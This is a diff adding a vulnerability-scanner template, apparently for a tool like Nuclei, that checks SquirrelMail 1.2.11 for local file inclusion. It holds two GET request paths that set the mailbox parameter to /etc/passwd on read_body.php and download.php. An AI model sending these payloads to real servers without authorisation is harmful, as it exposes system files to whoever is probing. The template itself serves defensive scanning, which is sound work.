@@ -1,0 +1,21 @@
+id: squirrelmail-lfi
+brief:
+    title: SquirrelMail 1.2.11 - Local File Inclusion
+    by: dhiyaneshDk
+    level: high
+    about: SquirrelMail 1.2.11 is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - squirrelmail
+        - edb
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/src/read_body.php?mailbox=/etc/passwd&passed_id=1&'
+        - '{{BaseURL}}/src/download.php?absolute_dl=true&passed_id=1&passed_ent_id=1&mailbox=/etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
